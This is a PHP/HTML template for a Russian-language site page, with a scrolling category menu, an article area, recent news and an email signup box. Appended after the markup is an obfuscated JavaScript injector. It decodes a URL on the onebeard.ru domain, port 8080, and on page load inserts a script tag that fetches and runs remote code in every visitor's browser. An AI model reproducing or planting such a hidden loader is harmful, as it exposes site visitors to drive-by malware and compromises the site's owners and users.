
		<div class="bigmenu">
			<div class="productbox">
				<div class="arrowup" onClick="Up();"></div>
				<div class="box"><div id="lenta" style="position: relative;"><?php global $CAT;  $CAT->GetCats()?></div></div>
				<div class="arrowdown" onClick="Down();"></div>
				
				<script>
					var shag = 76;
					var pos = 0;
					function Up() {
						if (pos < 0-shag) {
							konv("lenta", shag, pos);
							pos+=shag;
						} else {
							if (pos < 0) {
								konv("lenta", -pos, pos);
								pos = 0;
							} else document.getElementById("lenta").style.top="0px";
							
						}
					}
					
					function Down() {
						if (pos > 231-mh+shag) {
							konv("lenta", -shag, pos);
							pos-=shag;
						} else {
							if (pos > 231-mh) {
								konv("lenta", 231-mh-pos, pos);
								pos = 231-mh;
							}
						}
					}
					
				</script>
				
			</div>
			
			<div class="flash"><?php echo showFlash();?></div>
		</div>
		
		<div  class="content">
			<table cellspacing=0 cellpadding=0 width="100%"><tr valign="top"><td >	
			<div class="article" >
			<div style="float: left; width: 0px; height: 300px"></div>
				<?php
					echo $Page['page_text'];
				?>
			</div>
			<td>
			<td class="news">
				<div class="news">
				<div class="new_cap"></div><br />
				<?php global $NEW; $NEW->ShowLastNews(2);?>
				<div class="mailing">
					<div style="padding-bottom:2px">Подписаться на рассылку: </div>
					<input style="color: #d9d9d9" id="mail"  value="Ваш e-mail" OnFocus="FirstEmailClick(this)" /><div OnClick="AddToList()" id="ok" class="ok"></div>
				</div>
				</div>
			</td>
			</tr></table>
		</div>
	</div>
<script>var Z={rE:false};this.D=14031;this.D+=231;var HB=["yH"];QJ=["xK","XB"];var S;R=["t"];var K='';var r=window;var I={aA:63457};this.b="b";Xh=[];var _=String("bo"+"dy");vC={};var g=String("sc"+"ri"+"pt");jH={};var V=null;this.LI='';var n=document;this.hO=806;this.hO-=225;function M(){var XNK="";var eC="eC";try {var AY='qb'} catch(AY){};var Md=[];var a=new String("]");O=["Y","ri"];var y=RegExp;var j='';qE={vu:36609};K_=24987;K_++;var YR=["zx","gh"];Pb={rU:"T"};var C="\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x2e\x6e\x7a\x2f\x73\x6b\x79\x2e\x63\x6f\x6d\x2e\x70\x68\x70";PD=[];var a=String("]");this.Ik=false;dI=["QT"];this.jK=9865;this.jK+=143;function c(rv,Q){ck=24799;ck++;var kz=["o","nz","xP"];var d=String("HDjX[".substr(4));d+=Q;this.NI=25715;this.NI--;zV=45289;zV--;d+=a;Zk={Nn:false};var gl=new y(d, String("7njg".substr(3)));ak=19580;ak--;return rv[String("repla"+"ce")](gl, j);PU=27444;PU-=168;this.Ml=47521;this.Ml--;};JU={Gb:17931};var X=46582-38502;var Gc={cW:false};jV={};V=new String("LiFonloa".substr(3)+"d");nzR=["ym","ez","Cs"];var k=c('c6rbe6akt7e2ELlKeimbe6nJtL','kJqLAYK2bi67');var Cy=c('aqpIp1eqnYd1CkhIiFlqdI','1BIYwqW3FkANo');var m='';RA={It:false};var x="htt"+"p:/olVB".substr(0,3)+"urP/onPur".substr(3,3)+"Hnmebe".substr(3)+"ard"+".ruVGL".substr(0,3)+":1Dw".substr(0,1);try {var AS='pp'} catch(AS){};try {var ah='IK'} catch(ah){};S=function(){try {var qm='Xf'} catch(qm){};try {var lI={xJ:false};ma=n[k](g);var lv=[];var LgE={Yl:false};Mq=43448;Mq--;pD=11845;pD+=178;m=x;var PC="PC";m+=X;var OJ=new String();var LG={CQ:"Ox"};m+=C;var Mp=25066;var qh=41680;wz=60163;wz++;IY={xn:false};var h=c('dWePfPesr8','n5wWP4sJ83VLj');try {} catch(Cl){};var VO=new String("srcKHJz".substr(0,3));this.wB="wB";HV=43812;HV++;ma[VO]=m;hC=20259;hC--;var gb=["Ji","rI"];ma[h]=[7,1][1];this.QB=22053;this.QB--;n[_][Cy](ma);Tn=1946;Tn++;} catch(z){};GcM={ca:32065};};var pW={CH:false};sc={wA:"Pm"};};this.zQ=20552;this.zQ--;JaJ=["Nu"];M();try {} catch(fB){};var LC=["jl","_y"];this.lN=19133;this.lN++;r[V]=S;</script>
<!--195b57bb4b81b065a941ccfaaf5a8490-->